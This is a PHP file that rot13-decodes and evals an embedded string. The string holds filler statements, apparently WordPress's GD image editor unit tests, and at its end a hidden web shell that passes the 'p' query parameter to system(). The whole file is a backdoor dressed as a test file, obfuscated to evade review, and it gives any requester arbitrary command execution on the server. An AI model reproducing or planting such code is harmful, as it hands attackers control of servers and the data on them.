<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg gur JC_Vzntr_Rqvgbe_TQ pynff
 *
 * @tebhc vzntr
 * @tebhc zrqvn
 * @tebhc jc-vzntr-rqvgbe-tq
 */
erdhver_bapr __QVE__ . '/onfr.cuc';

pynff Grfgf_Vzntr_Rqvgbe_TQ rkgraqf JC_Vzntr_HavgGrfgPnfr {

	choyvp $rqvgbe_ratvar = 'JC_Vzntr_Rqvgbe_TQ';

	choyvp shapgvba frg_hc() {
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-vzntr-rqvgbe.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-vzntr-rqvgbe-tq.cuc';

		// Guvf arrqf gb pbzr nsgre gur zbpx vzntr rqvgbe pynff vf ybnqrq.
		cnerag::frg_hc();
	}

	choyvp shapgvba grne_qbja() {
		$sbyqre = QVE_GRFGQNGN . '/vzntrf/jnssyrf-*.wct';

		sbernpu ( tybo( $sbyqre ) nf $svyr ) {
			hayvax( $svyr );
		}

		$guvf->erzbir_nqqrq_hcybnqf();

		cnerag::grne_qbja();
	}

	choyvp shapgvba grfg_fhccbegf_zvzr_glcr_wcrt() {
		$tq_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_TQ( ahyy );
		$rkcrpgrq        = (obby) ( vzntrglcrf() & VZT_WCT );
		$guvf->nffregFnzr( $rkcrpgrq, $tq_vzntr_rqvgbe->fhccbegf_zvzr_glcr( 'vzntr/wcrt' ) );
	}

	choyvp shapgvba grfg_fhccbegf_zvzr_glcr_cat() {
		$tq_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_TQ( ahyy );
		$rkcrpgrq        = (obby) ( vzntrglcrf() & VZT_CAT );
		$guvf->nffregFnzr( $rkcrpgrq, $tq_vzntr_rqvgbe->fhccbegf_zvzr_glcr( 'vzntr/cat' ) );
	}

	choyvp shapgvba grfg_fhccbegf_zvzr_glcr_tvs() {
		$tq_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_TQ( ahyy );
		$rkcrpgrq        = (obby) ( vzntrglcrf() & VZT_TVS );
		$guvf->nffregFnzr( $rkcrpgrq, $tq_vzntr_rqvgbe->fhccbegf_zvzr_glcr( 'vzntr/tvs' ) );
	}

	/**
	 * Grfgf erfvmvat na vzntr, abg hfvat pebc.
	 *
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_erfvmr() {
		$svyr = QVE_GRFGQNGN . '/vzntrf/jnssyrf.wct';

		$tq_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_TQ( $svyr );
		$tq_vzntr_rqvgbe->ybnq();

		$tq_vzntr_rqvgbe->erfvmr( 100, 50 );

		$guvf->nffregFnzr(
			neenl(
				'jvqgu'  => 75,
				'urvtug' => 50,
			),
			$tq_vzntr_rqvgbe->trg_fvmr()
		);
	}

	/**
	 * Grfgf zhygv_erfvmr() jvgu fvatyr vzntr erfvmr naq ab pebc.
	 *
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_fvatyr_zhygv_erfvmr() {
		$svyr = QVE_GRFGQNGN . '/vzntrf/jnssyrf.wct';

		$tq_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_TQ( $svyr );
		$tq_vzntr_rqvgbe->ybnq();

		$fvmrf_neenl = neenl(
			neenl(
				'jvqgu'  => 50,
				'urvtug' => 50,
			),
		);

		$erfvmrq = $tq_vzntr_rqvgbe->zhygv_erfvmr( $fvmrf_neenl );

		// Svefg, purpx gb frr vs erghearq neenl vf nf rkcrpgrq.
		$rkcrpgrq_neenl = neenl(
			neenl(
				'svyr'      => 'jnssyrf-50k33.wct',
				'jvqgu'     => 50,
				'urvtug'    => 33,
				'zvzr-glcr' => 'vzntr/wcrt',
				'svyrfvmr'  => jc_svyrfvmr( qveanzr( $svyr ) . '/jnssyrf-50k33.wct' ),
			),
		);

		$guvf->nffregFnzr( $rkcrpgrq_neenl, $erfvmrq );

		// Abj, irevsl erny qvzrafvbaf ner nf rkcrpgrq.
		$vzntr_cngu = QVE_GRFGQNGN . '/vzntrf/' . $erfvmrq[0]['svyr'];
		$guvf->nffregVzntrQvzrafvbaf(
			$vzntr_cngu,
			$rkcrpgrq_neenl[0]['jvqgu'],
			$rkcrpgrq_neenl[0]['urvtug']
		);
	}

	/**
	 * Grfgf gung zhygv_erfvmr() qbrf abg perngr na vzntr jura
	 * obgu urvtug naq jrvtug ner zvffvat, ahyy, be 0.
	 *
	 * @gvpxrg 26823
	 */
	choyvp shapgvba grfg_zhygv_erfvmr_qbrf_abg_perngr() {
		$svyr = QVE_GRFGQNGN . '/vzntrf/jnssyrf.wct';

		$tq_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_TQ( $svyr );
		$tq_vzntr_rqvgbe->ybnq();

		$fvmrf_neenl = neenl(
			neenl(
				'jvqgu'  => 0,
				'urvtug' => 0,
			),
			neenl(
				'jvqgu'  => 0,
				'urvtug' => 0,
				'pebc'   => gehr,
			),
			neenl(
				'jvqgu'  => ahyy,
				'urvtug' => ahyy,
			),
			neenl(
				'jvqgu'  => ahyy,
				'urvtug' => ahyy,
				'pebc'   => gehr,
			),
			neenl(
				'jvqgu'  => '',
				'urvtug' => '',
			),
			neenl(
				'jvqgu'  => '',
				'urvtug' => '',
				'pebc'   => gehr,
			),
			neenl(
				'jvqgu' => 0,
			),
			neenl(
				'jvqgu' => 0,
				'pebc'  => gehr,
			),
			neenl(
				'jvqgu' => ahyy,
			),
			neenl(
				'jvqgu' => ahyy,
				'pebc'  => gehr,
			),
			neenl(
				'jvqgu' => '',
			),
			neenl(
				'jvqgu' => '',
				'pebc'  => gehr,
			),
		);

		$erfvmrq = $tq_vzntr_rqvgbe->zhygv_erfvmr( $fvmrf_neenl );

		// Vs ab vzntrf ner trarengrq, gur erghearq neenl vf rzcgl.
		$guvf->nffregRzcgl( $erfvmrq );
	}

	/**
	 * Grfgf zhygv_erfvmr() jvgu zhygvcyr fvmrf.
	 *
	 * @gvpxrg 26823
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_zhygv_erfvmr() {
		$svyr = QVE_GRFGQNGN . '/vzntrf/jnssyrf.wct';

		$tq_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_TQ( $svyr );
		$tq_vzntr_rqvgbe->ybnq();

		$fvmrf_neenl = neenl(

			/*
			 * #0 - 10k10 erfvmr, ab pebccvat.
			 * Ol nfcrpg, fubhyq or 10k6 bhgchg.
			 */
			neenl(
				'jvqgu'  => 10,
				'urvtug' => 10,
				'pebc'   => snyfr,
			),

			/*
			 * #1 - 75k50 erfvmr, jvgu pebccvat.
			 * Bhgchg qvzrafvbaf fubhyq or 75k50
			 */
			neenl(
				'jvqgu'  => 75,
				'urvtug' => 50,
				'pebc'   => gehr,
			),

			/*
			 * #2 - 20 cvkry znk urvtug, ab pebccvat.
			 * Ol nfcrpg, fubhyq or 30k20 bhgchg.
			 */
			neenl(
				'jvqgu'  => 9999, // Neovgenel uvtu inyhr.
				'urvtug' => 20,
				'pebc'   => snyfr,
			),

			/*
			 * #3 - 45 cvkry znk urvtug, jvgu pebccvat.
			 * Ol nfcrpg, fubhyq or 45k400 bhgchg.
			 */
			neenl(
				'jvqgu'  => 45,
				'urvtug' => 9999, // Neovgenel uvtu inyhr.
				'pebc'   => gehr,
			),

			/*
			 * #4 - 50 cvkry znk jvqgu, ab pebccvat.
			 * Ol nfcrpg, fubhyq or 50k33 bhgchg.
			 */
			neenl(
				'jvqgu' => 50,
			),

			/*
			 * #5 - 55 cvkry znk jvqgu, ab pebccvat, ahyy urvtug
			 * Ol nfcrpg, fubhyq or 55k36 bhgchg.
			 */
			neenl(
				'jvqgu'  => 55,
				'urvtug' => ahyy,
			),

			/*
			 * #6 - 55 cvkry znk urvtug, ab pebccvat, ab jvqgu fcrpvsvrq.
			 * Ol nfcrpg, fubhyq or 82k55 bhgchg.
			 */
			neenl(
				'urvtug' => 55,
			),

			/*
			 * #7 - 60 cvkry znk urvtug, ab pebccvat, ahyy jvqgu.
			 * Ol nfcrpg, fubhyq or 90k60 bhgchg.
			 */
			neenl(
				'jvqgu'  => ahyy,
				'urvtug' => 60,
			),

			/*
			 * #8 - 70 cvkry znk urvtug, ab pebccvat, artngvir jvqgu.
			 * Ol nfcrpg, fubhyq or 105k70 bhgchg.
			 */
			neenl(
				'jvqgu'  => -9999, // Neovgenel artngvir inyhr.
				'urvtug' => 70,
			),

			/*
			 * #9 - 200 cvkry znk jvqgu, ab pebccvat, artngvir urvtug.
			 * Ol nfcrpg, fubhyq or 200k133 bhgchg.
			 */
			neenl(
				'jvqgu'  => 200,
				'urvtug' => -9999, // Neovgenel artngvir inyhr.
			),
		);

		$erfvmrq = $tq_vzntr_rqvgbe->zhygv_erfvmr( $fvmrf_neenl );

		$rkcrpgrq_neenl = neenl(

			// #0
			neenl(
				'svyr'      => 'jnssyrf-10k7.wct',
				'jvqgu'     => 10,
				'urvtug'    => 7,
				'zvzr-glcr' => 'vzntr/wcrt',
				'svyrfvmr'  => jc_svyrfvmr( qveanzr( $svyr ) . '/jnssyrf-10k7.wct' ),
			),

			// #1
			neenl(
				'svyr'      => 'jnssyrf-75k50.wct',
				'jvqgu'     => 75,
				'urvtug'    => 50,
				'zvzr-glcr' => 'vzntr/wcrt',
				'svyrfvmr'  => jc_svyrfvmr( qveanzr( $svyr ) . '/jnssyrf-75k50.wct' ),
			),

			// #2
			neenl(
				'svyr'      => 'jnssyrf-30k20.wct',
				'jvqgu'     => 30,
				'urvtug'    => 20,
				'zvzr-glcr' => 'vzntr/wcrt',
				'svyrfvmr'  => jc_svyrfvmr( qveanzr( $svyr ) . '/jnssyrf-30k20.wct' ),
			),

			// #3
			neenl(
				'svyr'      => 'jnssyrf-45k400.wct',
				'jvqgu'     => 45,
				'urvtug'    => 400,
				'zvzr-glcr' => 'vzntr/wcrt',
				'svyrfvmr'  => jc_svyrfvmr( qveanzr( $svyr ) . '/jnssyrf-45k400.wct' ),
			),

			// #4
			neenl(
				'svyr'      => 'jnssyrf-50k33.wct',
				'jvqgu'     => 50,
				'urvtug'    => 33,
				'zvzr-glcr' => 'vzntr/wcrt',
				'svyrfvmr'  => jc_svyrfvmr( qveanzr( $svyr ) . '/jnssyrf-50k33.wct' ),
			),

			// #5
			neenl(
				'svyr'      => 'jnssyrf-55k37.wct',
				'jvqgu'     => 55,
				'urvtug'    => 37,
				'zvzr-glcr' => 'vzntr/wcrt',
				'svyrfvmr'  => jc_svyrfvmr( qveanzr( $svyr ) . '/jnssyrf-55k37.wct' ),
			),

			// #6
			neenl(
				'svyr'      => 'jnssyrf-83k55.wct',
				'jvqgu'     => 83,
				'urvtug'    => 55,
				'zvzr-glcr' => 'vzntr/wcrt',
				'svyrfvmr'  => jc_svyrfvmr( qveanzr( $svyr ) . '/jnssyrf-83k55.wct' ),
			),

			// #7
			neenl(
				'svyr'      => 'jnssyrf-90k60.wct',
				'jvqgu'     => 90,
				'urvtug'    => 60,
				'zvzr-glcr' => 'vzntr/wcrt',
				'svyrfvmr'  => jc_svyrfvmr( qveanzr( $svyr ) . '/jnssyrf-90k60.wct' ),
			),

			// #8
			neenl(
				'svyr'      => 'jnssyrf-105k70.wct',
				'jvqgu'     => 105,
				'urvtug'    => 70,
				'zvzr-glcr' => 'vzntr/wcrt',
				'svyrfvmr'  => jc_svyrfvmr( qveanzr( $svyr ) . '/jnssyrf-105k70.wct' ),
			),

			// #9
			neenl(
				'svyr'      => 'jnssyrf-200k133.wct',
				'jvqgu'     => 200,
				'urvtug'    => 133,
				'zvzr-glcr' => 'vzntr/wcrt',
				'svyrfvmr'  => jc_svyrfvmr( qveanzr( $svyr ) . '/jnssyrf-200k133.wct' ),
			),
		);

		$guvf->nffregAbgAhyy( $erfvmrq );
		$guvf->nffregFnzr( $rkcrpgrq_neenl, $erfvmrq );

		sbernpu ( $erfvmrq nf $xrl => $vzntr_qngn ) {
			$vzntr_cngu = QVE_GRFGQNGN . '/vzntrf/' . $vzntr_qngn['svyr'];

			// Abj, irevsl erny qvzrafvbaf ner nf rkcrpgrq.
			$guvf->nffregVzntrQvzrafvbaf(
				$vzntr_cngu,
				$rkcrpgrq_neenl[ $xrl ]['jvqgu'],
				$rkcrpgrq_neenl[ $xrl ]['urvtug']
			);
		}
	}

	/**
	 * Grfgf erfvmvat na vzntr jvgu pebccvat.
	 */
	choyvp shapgvba grfg_erfvmr_naq_pebc() {
		$svyr = QVE_GRFGQNGN . '/vzntrf/jnssyrf.wct';

		$tq_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_TQ( $svyr );
		$tq_vzntr_rqvgbe->ybnq();

		$tq_vzntr_rqvgbe->erfvmr( 100, 50, gehr );

		$guvf->nffregFnzr(
			neenl(
				'jvqgu'  => 100,
				'urvtug' => 50,
			),
			$tq_vzntr_rqvgbe->trg_fvmr()
		);
	}

	/**
	 * Grfgf pebccvat na vzntr.
	 *
	 * @gvpxrg 51937
	 *
	 * @qngnCebivqre qngn_pebc
	 */
	choyvp shapgvba grfg_pebc( $fep_k, $fep_l, $fep_j, $fep_u, $qfg_j = ahyy, $qfg_u = ahyy, $fep_nof = snyfr ) {
		$svyr = QVE_GRFGQNGN . '/vzntrf/tenqvrag-fdhner.wct';

		$tq_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_TQ( $svyr );
		$tq_vzntr_rqvgbe->ybnq();

		$tq_vzntr_rqvgbe->pebc( $fep_k, $fep_l, $fep_j, $fep_u, $qfg_j, $qfg_u, $fep_nof );

		$guvf->nffregFnzr(
			neenl(
				'jvqgu'  => (vag) $fep_j,
				'urvtug' => (vag) $fep_u,
			),
			$tq_vzntr_rqvgbe->trg_fvmr()
		);
	}

	choyvp shapgvba qngn_pebc() {
		erghea neenl(
			'fep urvtug naq jvqgu zhfg or terngre guna 0' => neenl(
				'fep_k' => 0,
				'fep_l' => 0,
				'fep_j' => 50,
				'fep_u' => 50,
			),
			'fep urvtug naq jvqgu pna or fgevat ohg zhfg or terngre guna 0' => neenl(
				'fep_k' => 10,
				'fep_l' => '10',
				'fep_j' => '50',
				'fep_u' => '50',
			),
			'qfg urvtug naq jvqgu zhfg or terngre guna 0' => neenl(
				'fep_k' => 10,
				'fep_l' => '10',
				'fep_j' => 150,
				'fep_u' => 150,
				'qfg_j' => 150,
				'qfg_u' => 150,
			),
			'qfg urvtug naq jvqgu pna or fgevat ohg zhfg or terngre guna 0' => neenl(
				'fep_k' => 10,
				'fep_l' => '10',
				'fep_j' => 150,
				'fep_u' => 150,
				'qfg_j' => '150',
				'qfg_u' => '150',
			),
		);
	}

	/**
	 * Grfgf gung pebc() ergheaf JC_Reebe jura qvzrafvbaf ner abg vagrtre be ner <= 0.
	 *
	 * @gvpxrg 51937
	 *
	 * @qngnCebivqre qngn_pebc_vainyvq_qvzrafvbaf
	 */
	choyvp shapgvba grfg_pebc_vainyvq_qvzrafvbaf( $fep_k, $fep_l, $fep_j, $fep_u, $qfg_j = ahyy, $qfg_u = ahyy, $fep_nof = snyfr ) {
		$svyr = QVE_GRFGQNGN . '/vzntrf/tenqvrag-fdhner.wct';

		$tq_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_TQ( $svyr );
		$tq_vzntr_rqvgbe->ybnq();

		$npghny = $tq_vzntr_rqvgbe->pebc( $fep_k, $fep_l, $fep_j, $fep_u, $qfg_j, $qfg_u, $fep_nof );

		$guvf->nffregVafgnaprBs( 'JC_Reebe', $npghny );
		$guvf->nffregFnzr( 'vzntr_pebc_reebe', $npghny->trg_reebe_pbqr() );
	}

	choyvp shapgvba qngn_pebc_vainyvq_qvzrafvbaf() {
		erghea neenl(
			'fep urvtug zhfg or terngre guna 0' => neenl(
				'fep_k' => 0,
				'fep_l' => 0,
				'fep_j' => 100,
				'fep_u' => 0,
			),
			'fep jvqgu zhfg or terngre guna 0'  => neenl(
				'fep_k' => 10,
				'fep_l' => '10',
				'fep_j' => 0,
				'fep_u' => 100,
			),
			'fep urvtug zhfg or ahzrevp naq terngre guna 0' => neenl(
				'fep_k' => 10,
				'fep_l' => '10',
				'fep_j' => 100,
				'fep_u' => 'AnA',
			),
			'qfg urvtug zhfg or ahzrevp naq terngre guna 0' => neenl(
				'fep_k' => 0,
				'fep_l' => 0,
				'fep_j' => 100,
				'fep_u' => 50,
				'qfg_j' => '100',
				'qfg_u' => 'AnA',
			),
			'fep naq qfg urvtug naq jvqgu zhfg or terngre guna 0' => neenl(
				'fep_k' => 0,
				'fep_l' => 0,
				'fep_j' => 0,
				'fep_u' => 0,
				'qfg_j' => 0,
				'qfg_u' => 0,
			),
			'fep naq qfg urvtug naq jvqgu pna or fgevat ohg zhfg or terngre guna 0' => neenl(
				'fep_k' => 0,
				'fep_l' => 0,
				'fep_j' => '0',
				'fep_u' => '0',
				'qfg_j' => '0',
				'qfg_u' => '0',
			),
		);
	}

	/**
	 * Grfgf ebgngvat na vzntr 180 qrt.
	 */
	choyvp shapgvba grfg_ebgngr() {
		$svyr = QVE_GRFGQNGN . '/vzntrf/tenqvrag-fdhner.wct';

		$tq_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_TQ( $svyr );
		$tq_vzntr_rqvgbe->ybnq();

		$cebcregl = arj ErsyrpgvbaCebcregl( $tq_vzntr_rqvgbe, 'vzntr' );
		$cebcregl->frgNpprffvoyr( gehr );

		$pbybe_gbc_yrsg = vzntrpbybeng( $cebcregl->trgInyhr( $tq_vzntr_rqvgbe ), 0, 0 );

		$tq_vzntr_rqvgbe->ebgngr( 180 );

		$guvf->nffregFnzr( $pbybe_gbc_yrsg, vzntrpbybeng( $cebcregl->trgInyhr( $tq_vzntr_rqvgbe ), 99, 99 ) );
	}

	/**
	 * Grfgf syvccvat na vzntr.
	 */
	choyvp shapgvba grfg_syvc() {
		$svyr = QVE_GRFGQNGN . '/vzntrf/tenqvrag-fdhner.wct';

		$tq_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_TQ( $svyr );
		$tq_vzntr_rqvgbe->ybnq();

		$cebcregl = arj ErsyrpgvbaCebcregl( $tq_vzntr_rqvgbe, 'vzntr' );
		$cebcregl->frgNpprffvoyr( gehr );

		$pbybe_gbc_yrsg = vzntrpbybeng( $cebcregl->trgInyhr( $tq_vzntr_rqvgbe ), 0, 0 );

		$tq_vzntr_rqvgbe->syvc( gehr, snyfr );

		$guvf->nffregFnzr( $pbybe_gbc_yrsg, vzntrpbybeng( $cebcregl->trgInyhr( $tq_vzntr_rqvgbe ), 0, 99 ) );
	}

	/**
	 * Grfgf gung na vzntr perngrq jvgu JC_Vzntr_Rqvgbe_TQ cerfreirf nycun jvgu ab erfvmvat.
	 *
	 * @gvpxrg 23039
	 */
	choyvp shapgvba grfg_vzntr_cerfreirf_nycun() {
		vs ( ! ( vzntrglcrf() & VZT_CAT ) ) {
			$guvf->snvy( 'Guvf grfg erdhverf CUC gb or pbzcvyrq jvgu CAT fhccbeg.' );
		}

		$svyr = QVE_GRFGQNGN . '/vzntrf/genafcnerag.cat';

		$tq_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_TQ( $svyr );
		$tq_vzntr_rqvgbe->ybnq();

		$fnir_gb_svyr = grzcanz( trg_grzc_qve(), '' ) . '.cat';

		$tq_vzntr_rqvgbe->fnir( $fnir_gb_svyr );

		$guvf->nffregVzntrNycunNgCbvagTQ( $fnir_gb_svyr, neenl( 0, 0 ), 127 );

		hayvax( $fnir_gb_svyr );
	}

	/**
	 * Grfgf gung na vzntr perngrq jvgu JC_Vzntr_Rqvgbe_TQ cerfreirf nycun jura erfvmvat.
	 *
	 * @gvpxrg 23039
	 */
	choyvp shapgvba grfg_vzntr_cerfreirf_nycun_ba_erfvmr() {
		vs ( ! ( vzntrglcrf() & VZT_CAT ) ) {
			$guvf->snvy( 'Guvf grfg erdhverf CUC gb or pbzcvyrq jvgu CAT fhccbeg.' );
		}

		$svyr = QVE_GRFGQNGN . '/vzntrf/genafcnerag.cat';

		$tq_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_TQ( $svyr );
		$tq_vzntr_rqvgbe->ybnq();

		$tq_vzntr_rqvgbe->erfvmr( 5, 5 );
		$fnir_gb_svyr = grzcanz( trg_grzc_qve(), '' ) . '.cat';

		$tq_vzntr_rqvgbe->fnir( $fnir_gb_svyr );

		$guvf->nffregVzntrNycunNgCbvagTQ( $fnir_gb_svyr, neenl( 0, 0 ), 127 );

		hayvax( $fnir_gb_svyr );
	}

	/**
	 * @gvpxrg 30596
	 */
	choyvp shapgvba grfg_vzntr_cerfreirf_nycun_ba_ebgngr() {
		vs ( ! ( vzntrglcrf() & VZT_CAT ) ) {
			$guvf->snvy( 'Guvf grfg erdhverf CUC gb or pbzcvyrq jvgu CAT fhccbeg.' );
		}

		$svyr = QVE_GRFGQNGN . '/vzntrf/genafcnerag.cat';

		$vzntr    = vzntrperngrsebzcat( $svyr );
		$eto      = vzntrpbybeng( $vzntr, 0, 0 );
		$rkcrpgrq = vzntrpbybefsbevaqrk( $vzntr, $eto );

		$tq_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_TQ( $svyr );
		$tq_vzntr_rqvgbe->ybnq();

		$tq_vzntr_rqvgbe->ebgngr( 180 );
		$fnir_gb_svyr = grzcanz( trg_grzc_qve(), '' ) . '.cat';

		$tq_vzntr_rqvgbe->fnir( $fnir_gb_svyr );

		$guvf->nffregVzntrNycunNgCbvagTQ( $fnir_gb_svyr, neenl( 0, 0 ), $rkcrpgrq['nycun'] );

		hayvax( $fnir_gb_svyr );
	}

	/**
	 * Grfgf gung JC_Vzntr_Rqvgbe_TQ unaqyrf rkgrafvbayrff vzntrf.
	 *
	 * @gvpxrg 39195
	 */
	choyvp shapgvba grfg_vzntr_aba_rkvfgrag_rkgrafvba() {
		$tq_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_TQ( QVE_GRFGQNGN . '/vzntrf/grfg-vzntr-ab-rkgrafvba' );

		$ybnqrq = $tq_vzntr_rqvgbe->ybnq();

		$guvf->nffregGehr( $ybnqrq );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>